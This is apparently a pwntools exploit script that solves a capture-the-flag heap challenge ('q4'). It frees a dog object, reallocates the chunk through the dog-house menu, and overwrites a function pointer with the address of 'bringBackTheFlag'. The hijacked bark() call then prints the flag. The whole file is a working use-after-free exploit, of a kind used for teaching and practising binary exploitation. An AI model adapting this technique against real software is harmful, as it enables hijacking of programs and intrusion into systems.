#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("q4")
libc = elf.libc

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# Index of allocated chunks.
index = 0

# Select the "malloc" option; send size.
# Returns chunk index.
def recv_menu():
    t = io.recvuntil('0: Quit\n')
    # log.info(t)

def newDog(name):
    io.sendline("1")
    io.sendlineafter("name him?\n", f'{name}')
    log.info(io.recvline())
    recv_menu()



# Select the "free" option; send index.
def kill_dog():
    io.sendline("4")
    log.info(io.recvuntil('0-1 car\n'))
    recv_menu()

def new_dog_house(addr,name):
    io.sendline("5")

    #WARNING: do not try to convert here the byte string to f-string
    #        because the non pritable ascii chars won't be sent!
    io.sendlineafter("Where do you build it?\n", addr)
    io.sendlineafter("How do you name it?\n", f"{name}")
    log.info(io.recvuntil('You build a new dog house.\n'))
    recv_menu()


io = start()

io.timeout = 0.1

# =============================================================================

bringBackTheFlag = elf.symbols['bringBackTheFlag']
#elf.sym.bringBackTheFlag
log.info(f"Addr of bringBackTheFlag= {hex(bringBackTheFlag)}")
# =-=-=- CREATE OVERLAPPING CHUNKS -=-=-=
recv_menu()
newDog("AAAA")
kill_dog()

log.info(str(hex(elf.sym.bringBackTheFlag))) #80487bb
new_dog_house(b'B'*4 + b'C'*4+b'D'*4 + p32(bringBackTheFlag),b"\x00")


# io.sendline("6") # For debugging purposes


log.info('Getting the flag...')
io.sendline('2')  # dog->bark()
flag = io.recvline()
log.success('FLAG: {}'.format(flag))

log.info(io.recvline())


# =============================================================================
io.interactive()
